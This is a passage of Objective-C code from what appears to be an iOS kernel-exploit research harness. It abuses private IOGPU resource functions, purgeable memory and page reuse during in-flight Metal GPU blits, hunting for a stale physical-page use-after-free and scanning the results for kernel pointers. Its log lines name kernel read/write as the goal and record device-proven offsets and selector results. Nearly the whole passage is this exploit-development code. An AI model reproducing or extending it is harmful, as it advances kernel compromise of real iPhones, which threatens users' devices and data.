    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"p011_v9_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    p011_fd = open(path.UTF8String, O_CREAT | O_TRUNC | O_WRONLY, 0644);

    p011_log("=== T020 v9: madvise/purgable old PFNs (keep MTLBuffer) ===");
    p011_log("[*] v8: INFLIGHT=0x41 POST=0x43 — GART snapshotted at commit.");
    p011_log("[*] v6 dealloc ignored (Metal hold). v9: MADV_FREE/DONTNEED + EMPTY.");
    p011_log("[*] Then 0xEE occupy. Keep MTLBuffer until wait. No QueueCreate.");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) { p011_log("STOP dlopen"); return p011_finish(); }
    g_detach = (P011Detach_t)dlsym(iogpu, "IOGPUResourceDetachBacking");
    g_repl   = (P011Replace_t)dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
    P011GetType_t getType = (P011GetType_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
    P011GetU64_t getLen = (P011GetU64_t)dlsym(iogpu, "IOGPUResourceGetGPUVirtualAddressLength");
    P011GetU64_t getVA  = (P011GetU64_t)dlsym(iogpu, "IOGPUResourceGetGPUVirtualAddress");
    if (!g_detach || !g_repl) { p011_log("STOP syms"); return p011_finish(); }

    typedef kern_return_t (*purg_t)(vm_map_t, vm_address_t, int, int *);
    purg_t pPurg = (purg_t)dlsym(RTLD_DEFAULT, "vm_purgable_control");

    g_dev = MTLCreateSystemDefaultDevice();
    if (!g_dev) { p011_log("STOP no device"); return p011_finish(); }
    g_q = [g_dev newCommandQueue];
    if (!g_q) { p011_log("STOP no queue"); return p011_finish(); }

    vm_address_t old_pages = 0;
    vm_size_t old_len = 0;
    int used_purg = 0;
    uint32_t typ = 0;
    uint64_t gva = 0, gvaLen = 0;
    const vm_size_t tries[] = { 0x4000, 0x10000 };
    int flags_try[2] = { VM_FLAGS_ANYWHERE | VM_FLAGS_PURGABLE, VM_FLAGS_ANYWHERE };
    for (int fi = 0; fi < 2 && !g_buf; fi++) {
        for (unsigned ti = 0; ti < 2 && !g_buf; ti++) {
            vm_size_t Ls = tries[ti];
            vm_address_t p = 0;
            if (vm_allocate(mach_task_self(), &p, Ls, flags_try[fi]) != KERN_SUCCESS || !p)
                continue;
            memset((void *)p, P011_FILL_OLD, (size_t)Ls);
            id<MTLBuffer> b = [g_dev newBufferWithBytesNoCopy:(void *)p
                                                       length:(NSUInteger)Ls
                                                      options:MTLResourceStorageModeShared
                                                  deallocator:^(void *ptr, NSUInteger n) {
                                                      (void)ptr; (void)n;
                                                  }];
            void *r = b ? p011_ref(b) : NULL;
            uint32_t t = (r && getType) ? getType(r) : 0;
            p011_log("[0] alloc flags=0x%x 0x%lx type=0x%x buf=%p",
                     flags_try[fi], (unsigned long)Ls, t, b);
            if (!b || !r || t != 0x80) {
                vm_deallocate(mach_task_self(), p, Ls);
                continue;
            }
            g_buf = b;
            g_ref = r;
            old_pages = p;
            old_len = Ls;
            used_purg = (fi == 0);
            typ = t;
            gvaLen = getLen ? getLen(r) : Ls;
            gva = getVA ? getVA(r) : 0;
        }
    }
    if (!g_buf || typ != 0x80) {
        p011_log("STOP no type 0x80");
        return p011_finish();
    }
    p011_log("[0] type=0x80 GPUVA=0x%llx GVALen=0x%llx old=0x%llx purgable=%d",
             (unsigned long long)gva, (unsigned long long)gvaLen,
             (unsigned long long)old_pages, used_purg);

    g_len = gvaLen ? gvaLen : (uint64_t)old_len;
    g_data = malloc((size_t)g_len);
    if (!g_data) { p011_log("STOP malloc"); return p011_finish(); }
    memset(g_data, P011_FILL_NEW, (size_t)g_len);

    id<MTLBuffer> stA = [g_dev newBufferWithLength:(NSUInteger)g_len options:MTLResourceStorageModeShared];
    id<MTLBuffer> stB = [g_dev newBufferWithLength:(NSUInteger)g_len options:MTLResourceStorageModeShared];
    if (!stA || !stB) { p011_log("STOP staging"); return p011_finish(); }
    memset([stA contents], P011_FILL_STG, (size_t)g_len);
    memset([stB contents], P011_FILL_STG, (size_t)g_len);

    id<MTLBuffer> dummy = [g_dev newBufferWithLength:(1u << 20) options:MTLResourceStorageModeShared];
    if (!dummy) { p011_log("STOP dummy"); return p011_finish(); }
    memset([dummy contents], 0xA5, (size_t)dummy.length);

    p011_log("\n--- dummy then copy, replace, madvise old PFNs, occupy ---");
    id<MTLCommandBuffer> cb = [g_q commandBuffer];
    id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
    for (int i = 0; i < 32; i++)
        [enc fillBuffer:dummy range:NSMakeRange(0, dummy.length) value:(uint8_t)0xA5];
    [enc copyFromBuffer:g_buf sourceOffset:0 toBuffer:stA destinationOffset:0
                   size:MIN(g_buf.length, stA.length)];
    [enc endEncoding];
    [cb commit];
    p011_log("[1] inflight CB committed");
    fcntl(p011_fd, F_FULLFSYNC);

    int d0 = g_detach(g_ref);
    p011_log("[2] detach=0x%08x", d0);
    fcntl(p011_fd, F_FULLFSYNC);
    int rk = -1;
    if (d0 == 0) {
        rk = g_repl(g_ref, g_data, g_len);
        p011_log("[3] replace(0x%llx)=0x%08x", g_len, rk);
    } else {
        p011_log("[3] skip replace");
    }

    /* Discard phys, keep VA for Metal. Do NOT vm_deallocate. */
    if (old_pages && old_len) {
        int m1 = madvise((void *)old_pages, (size_t)old_len, MADV_FREE);
        int m2 = madvise((void *)old_pages, (size_t)old_len, MADV_DONTNEED);
        p011_log("[4] madvise FREE=%d DONTNEED=%d errno=%d", m1, m2, errno);
        if (used_purg && pPurg) {
            int st = VM_PURGABLE_EMPTY;
            kern_return_t pr = pPurg(mach_task_self(), old_pages, VM_PURGABLE_SET_STATE, &st);
            p011_log("[4] vm_purgable_control EMPTY -> 0x%08x state=%d", (unsigned)pr, st);
        } else {
            p011_log("[4] purgable skip (used_purg=%d pPurg=%p)", used_purg, pPurg);
        }
    }

    const int nreuse = 16;
    vm_address_t reuse_base = 0;
    vm_size_t reuse_len = (vm_size_t)nreuse * 0x4000;
    kern_return_t vak = vm_allocate(mach_task_self(), &reuse_base, reuse_len, VM_FLAGS_ANYWHERE);
    p011_log("[5] vm_allocate 16x16K 0xEE -> 0x%08x", (unsigned)vak);
    if (vak == KERN_SUCCESS)
        memset((void *)(uintptr_t)reuse_base, P011_FILL_REUSE, (size_t)reuse_len);

    [cb waitUntilCompleted];
    {
        NSInteger st = [cb status];
        NSError *err = [cb error];
        p011_log("[6] inflight status=%ld%s%s", (long)st,
                 st == 4 ? " Completed" : (st == 5 ? " ERROR" : ""),
                 err ? [[NSString stringWithFormat:@" %@", err] UTF8String] : "");
        if (st != 4) {
            p011_log("=== verdict: INFLIGHT BLIT DID NOT COMPLETE (status=%ld). Not KRW. ===", (long)st);
            if (vak == KERN_SUCCESS)
                vm_deallocate(mach_task_self(), reuse_base, reuse_len);
            return p011_finish();
        }
    }

    uint8_t *a = (uint8_t *)[stA contents];
    int n11 = 0, n41 = 0, n43 = 0, n00 = 0, nfor = 0, nee = 0;
    uint8_t ff = 0;
    size_t scan = a ? MIN((size_t)g_len, (size_t)4096) : 0;
    if (a) {
        p011_classify(a, scan, &n11, &n41, &n43, &n00, &nfor, &ff);
        for (size_t i = 0; i < scan; i++)
            if (a[i] == P011_FILL_REUSE) nee++;
        nfor -= nee;
        if (nfor < 0) nfor = 0;
    }
    uint64_t k0 = 0;
    int nk = a ? p011_scan_kptr(a, scan, &k0) : 0;
    p011_log("[7] INFLIGHT scan %zu: n41=%d n43=%d n11=%d n00=%d nEE=%d nfor=%d nkptr=%d k0=0x%llx",
             scan, n41, n43, n11, n00, nee, nfor, nk, (unsigned long long)k0);

    id<MTLCommandBuffer> cb2 = [g_q commandBuffer];
    id<MTLBlitCommandEncoder> e2 = [cb2 blitCommandEncoder];
    [e2 copyFromBuffer:g_buf sourceOffset:0 toBuffer:stB destinationOffset:0
                  size:MIN(g_buf.length, stB.length)];
    [e2 endEncoding];
    [cb2 commit];
    [cb2 waitUntilCompleted];
    p011_log("[8] POST status=%ld", (long)[cb2 status]);

    uint8_t *b = (uint8_t *)[stB contents];
    int p11 = 0, p41 = 0, p43 = 0, p00 = 0, pfor = 0, pee = 0;
    uint8_t pff = 0;
    if (b) {
        p011_classify(b, scan, &p11, &p41, &p43, &p00, &pfor, &pff);
        for (size_t i = 0; i < scan; i++)
            if (b[i] == P011_FILL_REUSE) pee++;
        pfor -= pee;
        if (pfor < 0) pfor = 0;
    }
    uint64_t pk0 = 0;
    int pnk = b ? p011_scan_kptr(b, scan, &pk0) : 0;
    p011_log("[9] POST scan %zu: n41=%d n43=%d n11=%d n00=%d nEE=%d nfor=%d nkptr=%d k0=0x%llx",
             scan, p41, p43, p11, p00, pee, pfor, pnk, (unsigned long long)pk0);

    if (vak == KERN_SUCCESS)
        vm_deallocate(mach_task_self(), reuse_base, reuse_len);

    if (nk > 0)
        p011_log("=== verdict: INFLIGHT kptr (nkptr=%d k0=0x%llx). Phys read of kernel pages. Not a store. Not KRW. ===",
                 nk, (unsigned long long)k0);
    else if (nee > 0)
        p011_log("=== verdict: INFLIGHT 0xEE (%d). Snapshotted PFN reused by us. Window live. Not KRW. ===", nee);
    else if (nfor > 0)
        p011_log("=== verdict: INFLIGHT FOREIGN nfor=%d first=0x%02x. Paste. Not KRW. ===", nfor, ff);
    else if (n41 > 0 && p43 > p41)
        p011_log("=== verdict: still INFLIGHT=0x41 POST=0x43. madvise did not drop phys (Metal/IOMMU wired). Not KRW. ===");
    else if (n43 > n41)
        p011_log("=== verdict: INFLIGHT 0x43. Copy used new MD. No stale PFN. Not KRW. ===");
    else
        p011_log("=== verdict: in 41=%d 43=%d EE=%d / post 41=%d 43=%d. Paste. Not KRW. ===",
                 n41, n43, nee, p41, p43);
    return p011_finish();
}

typedef kern_return_t (*p011_purge_t)(void *, uint32_t, uint32_t *);
typedef uint32_t (*p011_checksys_t)(void *, uint32_t);
typedef kern_return_t (*p011_finishsys_t)(void *, uint32_t);
typedef kern_return_t (*p011_finishev_t)(void *, uint32_t);
typedef uint32_t (*p011_getconn_t)(void *);
typedef uint32_t (*p011_getqid_t)(void *);
typedef kern_return_t (*p011_submit_t)(void *, uint32_t, uint32_t, void *, uint64_t, uint32_t *);
typedef kern_return_t (*p011_shmem_t)(void *, uint32_t, uint32_t, void **, uint32_t *, uint32_t *);
typedef void (*p011_dshmem_t)(void *, uint32_t);
typedef void *(*p011_ioqcreate_t)(void *, void *, uint32_t, uint32_t);
typedef kern_return_t (*p011_ioqop_t)(void *);
typedef void (*p011_ioqrel_t)(void *);
typedef void *(*p011_getclient_t)(void *);
typedef kern_return_t (*p011_iocall_t)(
    mach_port_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);

+ (NSString *)runIogpuEarlyCompleteOracle {
    p011_buf = [NSMutableString string];
    g_surf = NULL;
    NSArray<NSString *> *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"p011_v10_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    p011_fd = open(path.UTF8String, O_CREAT | O_TRUNC | O_WRONLY, 0644);

    p011_log("=== T020 v10b: early-complete oracle (consumer FIRST, crashy ABI after) ===");
    p011_log("[*] v10a EXC_BAD_ACCESS PC=stack: FinishEvent blraa device+0x70 and/or");
    p011_log("[*]     Metal setPurgeableState(Empty) on bytesNoCopy (Metal serial queue).");
    p011_log("[*] CROSS-REF device-proved (A14 23F77) — do not invent:");
    p011_log("[*]   bytesNoCopy 0x4000 type=0x80 detach=0 replace=0 (v6/v8)");
    p011_log("[*]   Private type=0x0 detach=0xe00002bc (v7) — skip");
    p011_log("[*]   v8 INFLIGHT n41=4096 POST n43=4096; v9 madvise/EMPTY still n41");
    p011_log("[*]   v5 QueueCreate during blit = MTL Code=8 — no QueueCreate here");
    p011_log("[*]   P010 sel=6 0x410 SUCCESS; sel=7 first 0 second 2c2");
    p011_log("[*]   live sel=23 scIn=0 scOut=1; s_perform_io = Device sel=49");
    p011_log("[*]   Device UC sel=3 = clock getter stOut=8, NOT SetPurgeable");
    p011_log("[*]   SetPurgeable = dylib (res, state, &old) mov w1,#3; id at res+0x30");
    p011_log("[*]   connect = *(uint32*)(*(res+0x10)+0x14)  (device port)");
    p011_log("[*]   IOAccel purge: 0 keep / 1 nonvol / 2 vol / 3 empty");
    p011_log("[*]   Metal purge: 1 keep / 2 nonvol / 3 vol / 4 empty — NOT on bytesNoCopy");
    p011_log("[*]   VM_FLAGS_PURGABLE=0x2 (NOT 0x4000=OVERWRITE)");
    p011_log("[*]   2c2=BadArgument 2bc=Error. Not KRW. Keep MTLBuffer. No replace-first.");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iogpu) { p011_log("STOP dlopen IOGPU"); return p011_finish(); }

    g_detach = (P011Detach_t)dlsym(iogpu, "IOGPUResourceDetachBacking");
    g_repl   = (P011Replace_t)dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
    P011GetType_t getType = (P011GetType_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
    P011GetU64_t getLen = (P011GetU64_t)dlsym(iogpu, "IOGPUResourceGetGPUVirtualAddressLength");
    P011GetU64_t getVA  = (P011GetU64_t)dlsym(iogpu, "IOGPUResourceGetGPUVirtualAddress");
    p011_purge_t setPurg = (p011_purge_t)dlsym(iogpu, "IOGPUResourceSetPurgeable");
    p011_checksys_t checkSys = (p011_checksys_t)dlsym(iogpu, "IOGPUResourceCheckSysMem");
    p011_finishsys_t finSys = (p011_finishsys_t)dlsym(iogpu, "IOGPUResourceFinishSysMem");
    p011_getconn_t devConn = (p011_getconn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    p011_getconn_t qConn = (p011_getconn_t)dlsym(iogpu, "IOGPUCommandQueueGetConnect");
    p011_getqid_t qGetID = (p011_getqid_t)dlsym(iogpu, "IOGPUCommandQueueGetID");
    p011_submit_t submit = (p011_submit_t)dlsym(iogpu, "IOGPUCommandQueueSubmitCommandBuffers");
    p011_shmem_t mkShmem = (p011_shmem_t)dlsym(iogpu, "IOGPUDeviceCreateDeviceShmem");
    p011_dshmem_t rmShmem = (p011_dshmem_t)dlsym(iogpu, "IOGPUDeviceDestroyDeviceShmem");
    p011_ioqcreate_t ioqCreate = (p011_ioqcreate_t)dlsym(iogpu, "IOGPUIOCommandQueueCreate");
    p011_ioqop_t ioqPerf = (p011_ioqop_t)dlsym(iogpu, "IOGPUIOCommandQueuePerformIO");
    p011_ioqop_t ioqDone = (p011_ioqop_t)dlsym(iogpu, "IOGPUIOCommandQueueIOCommandBufferComplete");
    p011_ioqrel_t ioqRel = (p011_ioqrel_t)dlsym(iogpu, "IOGPUIOCommandQueueRelease");
    p011_getclient_t getCli = (p011_getclient_t)dlsym(iogpu, "IOGPUResourceGetClientShared");
    p011_iocall_t iocall = iokit ? (p011_iocall_t)dlsym(iokit, "IOConnectCallMethod") : NULL;
    typedef kern_return_t (*purgctl_t)(vm_map_t, vm_address_t, int, int *);
    purgctl_t pPurg = (purgctl_t)dlsym(RTLD_DEFAULT, "vm_purgable_control");

    p011_log("[sym] purge=%p checkSys=%p finSys=%p submit=%p shmem=%p ioqC=%p iocall=%p",
             setPurg, checkSys, finSys, submit, mkShmem, ioqCreate, iocall);
    if (!g_detach || !setPurg) { p011_log("STOP missing Detach/SetPurgeable"); return p011_finish(); }

    g_dev = MTLCreateSystemDefaultDevice();
    if (!g_dev) { p011_log("STOP no device"); return p011_finish(); }
    g_q = [g_dev newCommandQueue];
    if (!g_q) { p011_log("STOP no queue"); return p011_finish(); }
    p011_log("[0] metal %s class=%s qclass=%s",
             [[g_dev name] UTF8String],
             [NSStringFromClass([p011_unwrap(g_dev) class]) UTF8String],
             [NSStringFromClass([p011_unwrap(g_q) class]) UTF8String]);

    /* Ivar pointers only — do NOT GetConnect yet (PAC/wrong-type = v10a crash). */
    id mtlDev = p011_unwrap(g_dev);
    id mtlQ = p011_unwrap(g_q);
    void *devRef = p011_strip(p011_ivar(mtlDev, "_deviceRef"));
    void *qRef = p011_strip(p011_ivar(mtlQ, "_commandQueue"));
    p011_log("[0] _deviceRef=%p heap=%d  _commandQueue=%p heap=%d",
             devRef, p011_is_heap(devRef), qRef, p011_is_heap(qRef));
    fcntl(p011_fd, F_FULLFSYNC);

    uint32_t dconn = 0, qconn = 0, qid = 0;
    if (p011_is_heap(devRef) && devConn) {
        dconn = devConn(devRef);
        p011_log("[0] DeviceGetConnect -> %u", dconn);
    } else {
        p011_log("[0] skip DeviceGetConnect");
    }
    if (p011_is_heap(qRef) && qConn) {
        qconn = qConn(qRef);
        qid = qGetID ? qGetID(qRef) : 0;
        p011_log("[0] QueueGetConnect -> %u qid=%u same=%d", qconn, qid, dconn && dconn == qconn);
    } else {
        p011_log("[0] skip QueueGetConnect");
    }
    fcntl(p011_fd, F_FULLFSYNC);

    vm_address_t main_pages = 0, spare_pages = 0;
    vm_size_t main_len = 0, spare_len = 0;
    int used_purg = 0;
    uint32_t typ = 0;
    uint64_t gva = 0, gvaLen = 0;
    id<MTLBuffer> spare = nil;
    void *spare_ref = NULL;
    const vm_size_t tries[] = { 0x4000, 0x10000 };
    int flags_try[2] = { VM_FLAGS_ANYWHERE | VM_FLAGS_PURGABLE, VM_FLAGS_ANYWHERE };

    for (int which = 0; which < 2; which++) {
        id<MTLBuffer> got = nil;
        void *got_ref = NULL;
        vm_address_t got_p = 0;
        vm_size_t got_l = 0;
        int got_purg = 0;
        uint32_t got_t = 0;
        uint64_t got_gva = 0, got_glen = 0;
        for (int fi = 0; fi < 2 && !got; fi++) {
            for (unsigned ti = 0; ti < 2 && !got; ti++) {
                vm_size_t Ls = tries[ti];
                vm_address_t pg = 0;
                if (vm_allocate(mach_task_self(), &pg, Ls, flags_try[fi]) != KERN_SUCCESS || !pg)
                    continue;
                memset((void *)pg, which ? 0x5A : P011_FILL_OLD, (size_t)Ls);
                id<MTLBuffer> b = [g_dev newBufferWithBytesNoCopy:(void *)pg
                                                           length:(NSUInteger)Ls
                                                          options:MTLResourceStorageModeShared
                                                      deallocator:^(void *ptr, NSUInteger n) {
                                                          (void)ptr; (void)n;
                                                      }];
                void *r = b ? p011_ref(b) : NULL;
                uint32_t t = (r && getType) ? getType(r) : 0;
                p011_log("[0] %s flags=0x%x 0x%lx type=0x%x buf=%p",
                         which ? "spare" : "main", flags_try[fi], (unsigned long)Ls, t, b);
                if (!b || !r || t != 0x80) {
                    vm_deallocate(mach_task_self(), pg, Ls);
                    continue;
                }
                got = b; got_ref = r; got_p = pg; got_l = Ls;
                got_purg = (fi == 0); got_t = t;
                got_glen = getLen ? getLen(r) : Ls;
                got_gva = getVA ? getVA(r) : 0;
            }
        }
        if (which == 0) {
            g_buf = got; g_ref = got_ref; main_pages = got_p; main_len = got_l;
            used_purg = got_purg; typ = got_t; gva = got_gva; gvaLen = got_glen;
        } else {
            spare = got; spare_ref = got_ref; spare_pages = got_p; spare_len = got_l;
        }
    }
    if (!g_buf || typ != 0x80) {
        p011_log("STOP no type 0x80 main (v6/v8 had 0x4000 type=0x80)");
        return p011_finish();
    }
    p011_log("[0] MAIN type=0x80 GPUVA=0x%llx GVALen=0x%llx old=0x%llx purgable=%d flags_ok=%d",
             (unsigned long long)gva, (unsigned long long)gvaLen,
             (unsigned long long)main_pages, used_purg,
             (VM_FLAGS_PURGABLE == 2));
    p011_dump_res("[0] MAIN", g_ref);
    if (spare_ref) p011_dump_res("[0] SPARE", spare_ref);
    else p011_log("[0] SPARE missing");
    uint32_t rconn = p011_res_conn(g_ref);
    p011_log("[0] MAIN id=%u res_conn=%u dconn=%u", p011_res_id(g_ref), rconn, dconn);
    fcntl(p011_fd, F_FULLFSYNC);

    void *purge_target = spare_ref ? spare_ref : g_ref;
    const char *purge_tag = spare_ref ? "SPARE" : "MAIN";

    /* ---------- PART A: idle SetPurgeable C API only (IOAccel 0-3) ---------- */
    p011_log("\n=== PART A: idle IOGPUResourceSetPurgeable on %s (C API, no Metal Empty) ===", purge_tag);
    fcntl(p011_fd, F_FULLFSYNC);
    uint32_t empty_state = 3; /* IOAccel empty; 2 = volatile */
    if (setPurg) {
        for (uint32_t st = 0; st <= 3; st++) {
            uint32_t old = 0xFFFFFFFFu;
            p011_log("A  calling SetPurgeable(%u)", st);
            fcntl(p011_fd, F_FULLFSYNC);
            kern_return_t kr = setPurg(purge_target, st, &old);
            p011_log("A  SetPurgeable(%u) -> 0x%08x %s old=%u",
                     st, (unsigned)kr, p011_kr(kr), old);
            fcntl(p011_fd, F_FULLFSYNC);
            if (kr == 0 && st == 3)
                empty_state = 3;
        }
        uint32_t old = 0;
        kern_return_t kr = setPurg(purge_target, 1, &old);
        p011_log("A  restore SetPurgeable(1 nonvol) -> 0x%08x %s old=%u",
                 (unsigned)kr, p011_kr(kr), old);
    }
    p011_log("[*] skip Metal setPurgeableState on bytesNoCopy (v10a serial-queue crash)");

    /* ---------- PART F FIRST so a later ABI crash still leaves a verdict ---------- */
    g_len = gvaLen ? gvaLen : (uint64_t)main_len;
    g_data = malloc((size_t)g_len);
    if (!g_data) { p011_log("STOP malloc"); return p011_finish(); }
    memset(g_data, P011_FILL_NEW, (size_t)g_len);

    id<MTLBuffer> stA = [g_dev newBufferWithLength:(NSUInteger)g_len options:MTLResourceStorageModeShared];
    id<MTLBuffer> stB = [g_dev newBufferWithLength:(NSUInteger)g_len options:MTLResourceStorageModeShared];
    id<MTLBuffer> stC = [g_dev newBufferWithLength:(NSUInteger)g_len options:MTLResourceStorageModeShared];
    if (!stA || !stB || !stC) { p011_log("STOP staging"); return p011_finish(); }
    memset([stA contents], P011_FILL_STG, (size_t)g_len);
    memset([stB contents], P011_FILL_STG, (size_t)g_len);
    memset([stC contents], P011_FILL_STG, (size_t)g_len);

    id<MTLBuffer> dummy = [g_dev newBufferWithLength:(1u << 20) options:MTLResourceStorageModeShared];
    if (!dummy) { p011_log("STOP dummy"); return p011_finish(); }
    memset([dummy contents], 0xA5, (size_t)dummy.length);

    p011_log("\n=== PART F: commit dummy+copy, SetPurgeable EMPTY while ATTACHED, occupy, wait ===");
    p011_log("[*] no replace, no Metal Empty, no FinishEvent, no QueueCreate");
    fcntl(p011_fd, F_FULLFSYNC);

    id<MTLCommandBuffer> cb = [g_q commandBuffer];
    id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
    for (int i = 0; i < 32; i++)
        [enc fillBuffer:dummy range:NSMakeRange(0, dummy.length) value:(uint8_t)0xA5];
    [enc copyFromBuffer:g_buf sourceOffset:0 toBuffer:stA destinationOffset:0
                   size:MIN(g_buf.length, stA.length)];
    [enc endEncoding];
    [cb commit];
    p011_log("F  inflight CB committed (still attached, type 0x80)");
    fcntl(p011_fd, F_FULLFSYNC);

    if (setPurg) {
        uint32_t old = 0xFFFFFFFFu;
        kern_return_t kr = setPurg(g_ref, empty_state, &old);
        p011_log("F  SetPurgeable(%u EMPTY) -> 0x%08x %s old=%u",
                 empty_state, (unsigned)kr, p011_kr(kr), old);
        fcntl(p011_fd, F_FULLFSYNC);
        if (kr != 0 && empty_state != 2) {
            old = 0xFFFFFFFFu;
            kr = setPurg(g_ref, 2, &old);
            p011_log("F  SetPurgeable(2 fallback) -> 0x%08x %s old=%u",
                     (unsigned)kr, p011_kr(kr), old);
            fcntl(p011_fd, F_FULLFSYNC);
        }
    }

    if (main_pages && main_len) {
        int m1 = madvise((void *)main_pages, (size_t)main_len, MADV_FREE);
        int m2 = madvise((void *)main_pages, (size_t)main_len, MADV_DONTNEED);
        p011_log("F  madvise FREE=%d DONTNEED=%d errno=%d", m1, m2, errno);
        if (used_purg && pPurg) {
            int st = VM_PURGABLE_EMPTY;
            kern_return_t pr = pPurg(mach_task_self(), main_pages, VM_PURGABLE_SET_STATE, &st);
            p011_log("F  vm_purgable_control EMPTY -> 0x%08x state=%d", (unsigned)pr, st);
        } else {
            p011_log("F  vm_purgable skip (used_purg=%d)", used_purg);
        }
    }

    const int nreuse = 16;
    vm_address_t reuse_base = 0;
    vm_size_t reuse_len = (vm_size_t)nreuse * 0x4000;
    kern_return_t vak = vm_allocate(mach_task_self(), &reuse_base, reuse_len, VM_FLAGS_ANYWHERE);
    p011_log("F  vm_allocate 16x16K 0xEE -> 0x%08x", (unsigned)vak);
    if (vak == KERN_SUCCESS)
        memset((void *)(uintptr_t)reuse_base, P011_FILL_REUSE, (size_t)reuse_len);
    fcntl(p011_fd, F_FULLFSYNC);

    [cb waitUntilCompleted];
    {
        NSInteger st = [cb status];
        NSError *err = [cb error];
        p011_log("F  inflight status=%ld%s%s", (long)st,
                 st == 4 ? " Completed" : (st == 5 ? " ERROR" : ""),
                 err ? [[NSString stringWithFormat:@" %@", err] UTF8String] : "");
        if (st != 4) {
            p011_log("=== verdict F: INFLIGHT BLIT DID NOT COMPLETE (status=%ld). Not KRW. ===", (long)st);
            if (vak == KERN_SUCCESS)
                vm_deallocate(mach_task_self(), reuse_base, reuse_len);
            return p011_finish();
        }
    }

    uint8_t *a = (uint8_t *)[stA contents];
    int n11 = 0, n41 = 0, n43 = 0, n00 = 0, nfor = 0, nee = 0;
    uint8_t ff = 0;
    size_t scan = a ? MIN((size_t)g_len, (size_t)4096) : 0;
    if (a) {
        p011_classify(a, scan, &n11, &n41, &n43, &n00, &nfor, &ff);
        for (size_t i = 0; i < scan; i++)
            if (a[i] == P011_FILL_REUSE) nee++;
        nfor -= nee;
        if (nfor < 0) nfor = 0;
    }
    uint64_t k0 = 0;
    int nk = a ? p011_scan_kptr(a, scan, &k0) : 0;
    p011_log("F  INFLIGHT scan %zu: n41=%d n43=%d n11=%d n00=%d nEE=%d nfor=%d nkptr=%d k0=0x%llx",
             scan, n41, n43, n11, n00, nee, nfor, nk, (unsigned long long)k0);
    fcntl(p011_fd, F_FULLFSYNC);

    /* ---------- PART G: POST (still attached, no replace) ---------- */
    p011_log("\n=== PART G: POST blit (still attached, no replace) ===");
    id<MTLCommandBuffer> cb2 = [g_q commandBuffer];
    id<MTLBlitCommandEncoder> e2 = [cb2 blitCommandEncoder];
    [e2 copyFromBuffer:g_buf sourceOffset:0 toBuffer:stB destinationOffset:0
                  size:MIN(g_buf.length, stB.length)];
    [e2 endEncoding];
    [cb2 commit];
    [cb2 waitUntilCompleted];
    p011_log("G  POST status=%ld", (long)[cb2 status]);

    uint8_t *b = (uint8_t *)[stB contents];
    int p11 = 0, p41 = 0, p43 = 0, p00 = 0, pfor = 0, pee = 0;
    uint8_t pff = 0;
    if (b) {
        p011_classify(b, scan, &p11, &p41, &p43, &p00, &pfor, &pff);
        for (size_t i = 0; i < scan; i++)
            if (b[i] == P011_FILL_REUSE) pee++;
        pfor -= pee;
        if (pfor < 0) pfor = 0;
    }
    uint64_t pk0 = 0;
    int pnk = b ? p011_scan_kptr(b, scan, &pk0) : 0;
    p011_log("G  POST scan %zu: n41=%d n43=%d n11=%d n00=%d nEE=%d nfor=%d nkptr=%d k0=0x%llx",
             scan, p41, p43, p11, p00, pee, pfor, pnk, (unsigned long long)pk0);
    fcntl(p011_fd, F_FULLFSYNC);

    if (vak == KERN_SUCCESS)
        vm_deallocate(mach_task_self(), reuse_base, reuse_len);

    /* ---------- PART H: forgotten piece — inflight DETACH-ONLY (v8 always replaced) ---------- */
    p011_log("\n=== PART H: inflight detach-ONLY (no replace), occupy, wait ===");
    p011_log("[*] v8 detach+replace kept old PFNs wired (INFLIGHT 0x41). Detach-only may complete UPL.");
    fcntl(p011_fd, F_FULLFSYNC);
    memset([stC contents], P011_FILL_STG, (size_t)g_len);
    if (main_pages && main_len)
        memset((void *)main_pages, P011_FILL_OLD, (size_t)main_len);

    id<MTLCommandBuffer> cb3 = [g_q commandBuffer];
    id<MTLBlitCommandEncoder> e3 = [cb3 blitCommandEncoder];
    for (int i = 0; i < 32; i++)
        [e3 fillBuffer:dummy range:NSMakeRange(0, dummy.length) value:(uint8_t)0xA5];
    [e3 copyFromBuffer:g_buf sourceOffset:0 toBuffer:stC destinationOffset:0
                  size:MIN(g_buf.length, stC.length)];
    [e3 endEncoding];
    [cb3 commit];
    p011_log("H  inflight CB committed");
    fcntl(p011_fd, F_FULLFSYNC);

    int d0 = g_detach(g_ref);
    p011_log("H  detach=0x%08x (0 expected on 0x80; no replace)", d0);
    fcntl(p011_fd, F_FULLFSYNC);

    vm_address_t reuse2 = 0;
    kern_return_t vak2 = vm_allocate(mach_task_self(), &reuse2, reuse_len, VM_FLAGS_ANYWHERE);
    p011_log("H  vm_allocate 16x16K 0xEE -> 0x%08x", (unsigned)vak2);
    if (vak2 == KERN_SUCCESS)
        memset((void *)(uintptr_t)reuse2, P011_FILL_REUSE, (size_t)reuse_len);

    [cb3 waitUntilCompleted];
    p011_log("H  inflight status=%ld", (long)[cb3 status]);

    uint8_t *c = (uint8_t *)[stC contents];
    int h11 = 0, h41 = 0, h43 = 0, h00 = 0, hfor = 0, hee = 0;
    uint8_t hff = 0;
    if (c) {
        p011_classify(c, scan, &h11, &h41, &h43, &h00, &hfor, &hff);
        for (size_t i = 0; i < scan; i++)
            if (c[i] == P011_FILL_REUSE) hee++;
        hfor -= hee;
        if (hfor < 0) hfor = 0;
    }
